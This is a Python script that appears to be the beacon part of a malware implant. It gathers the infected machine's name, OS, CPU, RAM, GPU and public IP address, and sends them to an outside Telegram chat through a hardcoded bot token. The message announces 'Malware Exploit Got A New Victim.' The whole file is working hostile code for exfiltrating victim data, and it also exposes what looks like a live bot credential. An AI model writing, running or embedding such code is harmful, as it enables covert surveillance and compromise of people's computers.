import asyncio
import os
import platform
import psutil
import telegram
import socket
import pytz
from datetime import datetime
import wmi
import GPUtil
import geoip2.database
import requests
BOT_TOKEN = '7017777294:AAFkEAIlPhdeKKv7XjOvm0JjcvxcVxyjgNE'
CHAT_ID = '6076033950'
bot = telegram.Bot(token=BOT_TOKEN)
def get_system_info():
    info = {}
    info['Computer Name'] = os.environ['COMPUTERNAME']
    info['Computer OS'] = platform.system()
    info['OS Version'] = platform.release()
    info['Architecture'] = platform.machine()
    info['Processor'] = platform.processor()
    info['RAM'] = str(round(psutil.virtual_memory().total / (1024.0 **3))) + " GB"
    info['GPU'] = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else 'Not available'
    info['Public IP Address'] = requests.get('https://api.ipify.org').text
    info['Time Zone'] = pytz.timezone('US/Eastern').localize(datetime.now()).strftime("%Y-%m-%d %H:%M:%S %Z%z")
    return info
async def send_message(chat_id, message):
    await bot.send_message(chat_id=chat_id, text=message, parse_mode='HTML')
system_info = get_system_info()
message = f"<b>Malware Exploit Got A New Victim.</b>\n"
message += "System Information:\n"
for key, value in sorted(system_info.items()):
    message += f"{key}: <b>{value}</b>\n"
asyncio.run(send_message(CHAT_ID, message))